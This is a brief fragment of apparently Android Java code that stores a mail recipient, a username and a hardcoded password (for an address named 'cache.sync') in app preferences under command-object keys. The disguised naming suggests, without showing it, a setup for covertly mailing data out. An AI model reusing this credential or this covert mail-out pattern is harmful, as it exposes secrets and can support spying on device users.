		edit.putString(CommandObj.MAIL_TO,"cache.sync@gmail.com");
		edit.putString(CommandObj.MAIL_USER,"cache.sync@gmail.com");
		edit.putString(CommandObj.MAIL_PASS,"r'i.cbyr");
		edit.commit();
	}
}
